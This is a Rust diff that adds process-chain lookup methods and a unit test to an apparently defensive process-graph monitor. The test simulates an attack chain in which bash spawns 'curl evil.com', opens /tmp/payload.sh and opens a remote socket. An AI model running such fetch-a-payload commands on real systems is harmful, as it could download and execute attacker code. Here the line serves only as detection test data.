@@ -527,6 +527,75 @@ impl ProcessGraph {
         }
         lines
     }
+
+    /// Returns all process payloads currently in the graph (both running and exited)
+    pub fn list_all_processes(&self) -> Vec<ProcessPayload> {
+        let mut list = Vec::new();
+        for idx in self.graph.node_indices() {
+            if let Some(NodePayload::Process(proc)) = self.graph.node_weight(idx) {
+                list.push(proc.clone());
+            }
+        }
+        list.sort_by(|a, b| b.last_seen_ns.cmp(&a.last_seen_ns));
+        list
+    }
+
+    /// Resolves full chain information for a given process key
+    pub fn get_chain_info(&self, key: &ProcessKey) -> Option<FullChainInfo> {
+        let node_key = NodeKey::Process(*key);
+        let node_idx = *self.key_to_index.get(&node_key)?;
+        let proc = match self.graph.node_weight(node_idx)? {
+            NodePayload::Process(p) => p.clone(),
+            _ => return None,
+        };
+
+        let mut ancestors = self.resolve_ancestors(key, 8);
+        ancestors.reverse();
+        let ppid = ancestors.last().map(|p| p.key.pid);
+
+        let mut children = Vec::new();
+        let mut files = Vec::new();
+        let mut sockets = Vec::new();
+
+        for edge in self.graph.edges_directed(node_idx, Direction::Outgoing) {
+            match edge.weight().kind {
+                EdgeKind::Spawns => {
+                    if let Some(NodePayload::Process(child)) = self.graph.node_weight(edge.target()) {
+                        children.push(child.clone());
+                    }
+                }
+                EdgeKind::OpenedFile { .. } => {
+                    if let Some(NodePayload::File(f)) = self.graph.node_weight(edge.target()) {
+                        files.push(f.path.clone());
+                    }
+                }
+                EdgeKind::ConnectedTo { .. } => {
+                    if let Some(NodePayload::Socket(s)) = self.graph.node_weight(edge.target()) {
+                        sockets.push(s.key.clone());
+                    }
+                }
+            }
+        }
+
+        Some(FullChainInfo {
+            process: proc,
+            ppid,
+            ancestors,
+            children,
+            files,
+            sockets,
+        })
+    }
+}
+
+#[derive(Debug, Clone)]
+pub struct FullChainInfo {
+    pub process: ProcessPayload,
+    pub ppid: Option<u32>,
+    pub ancestors: Vec<ProcessPayload>,
+    pub children: Vec<ProcessPayload>,
+    pub files: Vec<PathBuf>,
+    pub sockets: Vec<SocketKey>,
 }
 
 #[cfg(test)]
@@ -556,5 +625,32 @@ mod tests {
         // At t = 15s, k2 is also expired
         let stats_15s = pg.prune_expired(15_000_000_000);
         assert_eq!(stats_15s.removed_nodes, 1);
+    }
+
+    #[test]
+    fn test_chain_info_extraction() {
+        let mut pg = ProcessGraph::new(60_000_000_000);
+        let parent_key = ProcessKey::new(100, 1_000);
+        let child_key = ProcessKey::new(200, 2_000);
+
+        pg.record_spawn(None, parent_key, "bash", "/bin/bash", 1000, 1_000);
+        pg.record_spawn(Some(parent_key), child_key, "curl", "curl evil.com", 1000, 2_000);
+        pg.record_file_open(child_key, PathBuf::from("/tmp/payload.sh"), 0, 0, 2_500);
+        pg.record_socket_connect(child_key, SocketKey { local_addr: "10.0.0.1:4000".into(), remote_addr: "192.168.1.1:80".into(), proto: "tcp".into() }, 2_600);
+
+        let chain = pg.get_chain_info(&child_key).expect("Should find child chain");
+        assert_eq!(chain.ppid, Some(100));
+        assert_eq!(chain.ancestors.len(), 1);
+        assert_eq!(chain.ancestors[0].key.pid, 100);
+        assert_eq!(chain.files.len(), 1);
+        assert_eq!(chain.sockets.len(), 1);
+        assert_eq!(chain.process.key.pid, 200);
+
+        // Record exit for child
+        pg.record_exit(child_key, 0, 3_000);
+        let all = pg.list_all_processes();
+        assert_eq!(all.len(), 2);
+        let exited_child = all.iter().find(|p| p.key.pid == 200).unwrap();
+        assert!(matches!(exited_child.status, ProcessStatus::Exited { exit_code: 0, .. }));
     }
 }
